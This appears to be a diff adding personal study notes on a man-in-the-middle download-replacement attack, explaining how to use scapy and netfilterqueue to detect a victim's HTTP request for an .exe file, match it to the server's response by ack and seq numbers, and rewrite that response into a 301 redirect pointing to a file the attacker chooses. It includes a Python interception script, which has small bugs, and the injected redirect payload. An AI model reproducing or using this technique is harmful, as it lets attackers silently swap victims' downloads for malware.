@@ -1,0 +1,99 @@
+now in this our goal is to inject a different download file or intercept different file instead of the actual one that user asked or requested one for
+
+if someone tries to download a file, then the request for the download goes throught the http layer not in the DNS layer
+this means that we have to check for the http requests in user response and request packets
+
+scapy http request method works fine to check and read the information inside the packet, but to write the information inside the packet makes it complex
+
+so one of the best ways is to manually check for the layers and differentiate them and then modify the information inside the packet
+
+if there are any information or http layers inside a packet then all of these layers are inside the RAW layer in the scapy packet
+
+The TCP layer in a scapy packet contains the parameters dport(destination-port) and sport(source-port)
+based on this parameter values we can determine the which packet this is, like this is response or request packet
+
+example:
+if dport is "http" then it means that this is the request packet going to the http layer
+if sport is "http" then it means that this is the response packet coming from the http layer
+
+the actual port number by-default used by these packets is 80(but we see in the packet it is written as http)
+with this information based on the values of the parameters dport and sport , we can filter the http request and http response packets
+
+when you request for downloading a file then the there will be http request packet sent to the website which also gives the information in the Raw layer about the download file
+the information we can see in the Raw layer:
+  the host site that the user requested for
+  and the path to the file that is requested for download
+  Host: <domain site>
+  filePath -> GET <path>
+
+by this information we can detect acctually which file that the user is requesting to download
+
+so we can directly change the host address and the path, this takes a lot of work and also we have to manually initialize the "TCP handshake"
+
+the other way is to let the request packet forward to the router and wait for the response packet,
+then modify the response packet, as the handshake is already been established and we dont have to create one
+
+now we have information about and in both request and response packets
+but we dont know yet which response packet corresponds to which request packet
+
+the connection between the request and the response is:
+  the value of the parameter "ack" in the request pakcet is same as the value of the parameter "seq" in the response packet
+
+based on these values we can connect which request pakcet has which response
+for this we append the ack values in a list in the packet request process and check the values of seq ni response packet are there in the list or not
+
+
+--------------python code start-----------------
+# !/usr/bin/env python
+
+import netfilterqueue #importing the netfilterqueue module
+import scapy.all as scapy #importing scapy module
+
+ack_list = []
+
+def file_intercept(packet):
+	scapy_packet = scapy.IP(packet.get_payload) 
+	if scapy_packet.haslayer(scapy.Raw): 
+		if scapy_packet[scapy.TCP].dport == 80:
+			print("[+] HTTP REQUEST")
+			if ".exe" in scapy_packet[scapy.Raw].load: 
+				print("[+] Request to download .exe file")
+				ack_list.append(scapy_packet[scapy.TCP].ack)
+				print(scapy_packet.show())
+		elif scapy_packet[scapy.TCP].sport == 80:
+			print("[+] HTTP RESPONSE")
+			if scapy_packet[scapy.TCP].seq in ack_list:
+				print("[+] Replacing the original file")
+				ack_list.remove(scapy_packet[scapy.TCP].seq)
+				print(scapy_packet.show())
+
+
+
+queue0 = netfilterqueue.NetfilterQueue
+queue0.bind(0, file_intercept)
+queue0.run()
+----------------------python code end--------------------
+
+this above python code can finally do differentiate the particular request and responses for a particular download request
+and also this program does show the output only if the user tries to request for file download
+
+in the http response that under the load layer, we can see the http response from the server
+https://en.wikipedia.org/wiki/List_of_HTTP_status_codes [http response codes]
+we can also see the contents of the file that are transmitted in the hex code, in the load layer
+
+this status codes represent, how server responded to the requests sent by the user,
+we are achieving to manipulate the download file, so we have redirect user to new site..which comes with the status code of 301
+
+to achieve this we need to modify the information inside the load layer which is also a string,
+https://en.wikipedia.org/wiki/HTTP_301 -> can refer here, to see how response from server looks like...
+
+therefore the modification will be:
+scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp"
+the modified string should look like this, except that the url is the one you wanted to serve to the user..
+
+since we modified the response packet, then the len and chksum values change accordingly in the IP and TCP layer, 
+again scapy can calculate these values automatically if we didnt specify them,
+so we just remove these values in our code
+
+now its time to set the payload of the packets in the queue to the scapy_packet that we are modifying till now
+
